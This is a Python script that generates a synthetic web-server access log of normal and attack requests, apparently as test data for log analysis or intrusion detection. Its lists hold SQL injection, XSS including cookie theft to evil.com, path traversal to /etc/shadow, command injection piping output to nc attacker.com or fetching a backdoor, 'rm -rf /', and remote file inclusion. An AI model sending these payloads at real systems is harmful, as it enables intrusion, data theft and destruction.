import random
from datetime import datetime, timedelta

# 配置
NUM_LOGS = 1200
OUTPUT_FILE = "test_logs_large.log"

# IP 地址池
normal_ips = [f"192.168.1.{i}" for i in range(100, 200)]
attacker_ips = [f"203.0.113.{i}" for i in range(40, 60)]
scanner_ips = [f"172.16.0.{i}" for i in range(10, 30)]
api_ips = [f"10.0.0.{i}" for i in range(50, 70)]

# 正常 URL
normal_urls = [
    "/index.html", "/about.html", "/contact", "/products", "/services",
    "/blog", "/news", "/faq", "/help", "/support",
    "/css/style.css", "/js/app.js", "/images/logo.png", "/favicon.ico",
    "/api/users", "/api/products", "/api/orders", "/api/settings",
    "/docs/api", "/terms", "/privacy", "/careers", "/events",
    "/gallery", "/downloads", "/resources", "/press", "/partners"
]

# SQL 注入攻击
sqli_attacks = [
    "/api/users?id=1 OR 1=1--",
    "/search?q=' UNION SELECT username,password FROM users--",
    "/login?user=admin'--",
    "/items?id=1; DROP TABLE users;--",
    "/products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "/api/data?filter=' OR '1'='1",
    "/users?sort=name; EXEC xp_cmdshell('dir')--",
    "/search?q='; INSERT INTO admin VALUES('hacker','pass')--",
    "/api/query?sql=SELECT * FROM users WHERE id=1 OR 1=1",
    "/products?id=1 UNION ALL SELECT NULL,NULL,NULL--",
]

# XSS 攻击
xss_attacks = [
    "/search?q=<script>alert('XSS')</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/profile?name=<svg/onload=alert('XSS')>",
    "/feedback?msg=<body onload=alert('XSS')>",
    "/redirect?url=javascript:alert(document.domain)",
    "/user?callback=<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "/search?q=<iframe src='javascript:alert(1)'>",
    "/input?value=<div style='background:url(javascript:alert(1))'>",
    "/page?content=<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "/render?template=<marquee onstart=alert('XSS')>",
]

# 目录遍历攻击
path_traversal = [
    "/../../etc/passwd",
    "/page?file=....//....//etc/shadow",
    "/download?file=../../../../windows/win.ini",
    "/include?path=../../../etc/hosts",
    "/view?doc=..\\..\\..\\boot.ini",
    "/files?name=....//....//....//etc/passwd",
    "/read?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/load?template=..%252f..%252f..%252fetc%2fshadow",
]

# 命令注入
cmd_injection = [
    "/cgi-bin/test.cgi?cmd=cat /etc/passwd",
    "/exec?cmd=ls -la | nc attacker.com 4444",
    "/shell?cmd=wget http://malicious.com/backdoor.sh",
    "/ping?host=127.0.0.1; cat /etc/passwd",
    "/lookup?domain=example.com && whoami",
    "/trace?ip=8.8.8.8 | rm -rf /",
    "/debug?command=powershell -enc Base64EncodedPayload",
]

# 文件包含攻击
file_inclusion = [
    "/template?file=php://filter/convert.base64-encode/resource=index.php",
    "/include?page=http://evil.com/malicious.php",
    "/load?module=file:///etc/passwd",
    "/view?tpl=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "/render?layout=expect://id",
]

# 敏感文件扫描
sensitive_files = [
    "/.env", "/.git/config", "/wp-config.php", "/config.yml",
    "/backup.sql", "/database.sql", "/dump.sql",
    "/admin/config.php.bak", "/server.xml", "/web.config",
    "/phpmyadmin/", "/wp-admin/install.php", "/manager/html",
    "/jenkins/script", "/solr/admin/info/system",
    "/actuator/env", "/debug/vars", "/console",
    "/server-status", "/grafana/login", "/kibana/app/kibana",
    "/elastic/", "/mongo/", "/redis/info",
]

# 扫描器特征
scanner_paths = [
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/.well-known/security.txt", "/security.txt",
    "/api/swagger.json", "/api-docs", "/openapi.json",
    "/graphql", "/graphiql", "/playground",
]

# User-Agent 池
normal_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

attack_agents = [
    "sqlmap/1.7", "Nikto/2.1.6", "Nmap Scripting Engine",
    "DirBuster-1.0", "gobuster/3.6", "WPScan v3.8",
    "masscan/1.3", "Acunetix-Product", "ZmEu",
    "curl/7.68.0", "Python-urllib/3.11", "Go-http-client/1.1",
]

api_agents = [
    "PostmanRuntime/7.36.0", "axios/1.6.0", "okhttp/4.12.0",
    "fetch", "HTTPie/3.2", "Insomnia/2023.5",
]

bot_agents = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "YandexBot/3.0 (+http://yandex.com/bots)",
    "DuckDuckBot/1.0 (+http://duckduckgo.com/duckduckbot.html)",
    "Baiduspider/2.0",
]

methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
status_codes_normal = [200, 200, 200, 200, 201, 204, 301, 302, 304]
status_codes_error = [400, 401, 403, 404, 500, 502, 503]

def generate_timestamp(base_time, offset_seconds):
    dt = base_time + timedelta(seconds=offset_seconds)
    return dt.strftime("[%d/%b/%Y:%H:%M:%S +0800]")

def generate_log(ip, timestamp, method, url, status, size, referer, agent):
    return f'{ip} - - {timestamp} "{method} {url} HTTP/1.1" {status} {size} "{referer}" "{agent}"'

# 生成日志
logs = []
base_time = datetime(2026, 4, 26, 8, 0, 0)

print("开始生成日志...")

for i in range(NUM_LOGS):
    offset = i * 2  # 每条日志间隔 2 秒
    timestamp = generate_timestamp(base_time, offset)
    
    # 决定日志类型
    rand = random.random()
    
    if rand < 0.50:  # 50% 正常请求
        ip = random.choice(normal_ips)
        url = random.choice(normal_urls)
        method = random.choices(["GET", "POST"], weights=[80, 20])[0]
        status = random.choice(status_codes_normal)
        size = random.randint(200, 50000)
        agent = random.choice(normal_agents + bot_agents)
        referer = random.choice(["-", "http://example.com", "http://example.com/index.html"])
        
    elif rand < 0.65:  # 15% SQL 注入
        ip = random.choice(attacker_ips)
        url = random.choice(sqli_attacks)
        method = "GET"
        status = random.choice([200, 500, 500])
        size = random.randint(100, 500)
        agent = random.choice(attack_agents[:3])
        referer = "-"
        
    elif rand < 0.78:  # 13% XSS
        ip = random.choice(attacker_ips)
        url = random.choice(xss_attacks)
        method = "GET"
        status = random.choice([200, 200, 403])
        size = random.randint(100, 1000)
        agent = random.choice(normal_agents[:3])
        referer = "-"
        
    elif rand < 0.86:  # 8% 目录遍历
        ip = random.choice(scanner_ips)
        url = random.choice(path_traversal)
        method = "GET"
        status = random.choice([403, 404, 400])
        size = random.randint(200, 300)
        agent = random.choice(attack_agents[3:6])
        referer = "-"
        
    elif rand < 0.92:  # 6% 命令注入
        ip = random.choice(attacker_ips)
        url = random.choice(cmd_injection)
        method = random.choice(["GET", "POST"])
        status = random.choice([500, 500, 403])
        size = random.randint(100, 300)
        agent = random.choice(attack_agents[6:])
        referer = "-"
        
    elif rand < 0.96:  # 4% 文件包含
        ip = random.choice(attacker_ips)
        url = random.choice(file_inclusion)
        method = "GET"
        status = random.choice([200, 403, 500])
        size = random.randint(100, 1000)
        agent = random.choice(normal_agents[:2])
        referer = "-"
        
    elif rand < 0.98:  # 2% 敏感文件扫描
        ip = random.choice(scanner_ips)
        url = random.choice(sensitive_files)
        method = "GET"
        status = random.choice([404, 403, 404])
        size = random.randint(200, 300)
        agent = random.choice(attack_agents)
        referer = "-"
        
    else:  # 2% API 调用
        ip = random.choice(api_ips)
        url = random.choice(["/api/users", "/api/products", "/api/orders", "/api/analytics", "/api/health"])
        method = random.choice(methods[:5])
        status = random.choice([200, 201, 204, 400, 401])
        size = random.randint(50, 2000)
        agent = random.choice(api_agents)
        referer = "-"
    
    log_line = generate_log(ip, timestamp, method, url, status, size, referer, agent)
    logs.append(log_line)

# 写入文件
with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
    f.write('\n'.join(logs))

print(f"✅ 成功生成 {len(logs)} 条日志")
print(f"📁 文件位置: {OUTPUT_FILE}")
print(f"📊 文件大小: {len('\\n'.join(logs)) / 1024:.2f} KB")

# 统计信息
print("\n📈 日志分布:")
print(f"  - 正常请求: ~{int(NUM_LOGS * 0.50)} 条 (50%)")
print(f"  - SQL 注入: ~{int(NUM_LOGS * 0.15)} 条 (15%)")
print(f"  - XSS 攻击: ~{int(NUM_LOGS * 0.13)} 条 (13%)")
print(f"  - 目录遍历: ~{int(NUM_LOGS * 0.08)} 条 (8%)")
print(f"  - 命令注入: ~{int(NUM_LOGS * 0.06)} 条 (6%)")
print(f"  - 文件包含: ~{int(NUM_LOGS * 0.04)} 条 (4%)")
print(f"  - 敏感扫描: ~{int(NUM_LOGS * 0.02)} 条 (2%)")
print(f"  - API 调用: ~{int(NUM_LOGS * 0.02)} 条 (2%)")
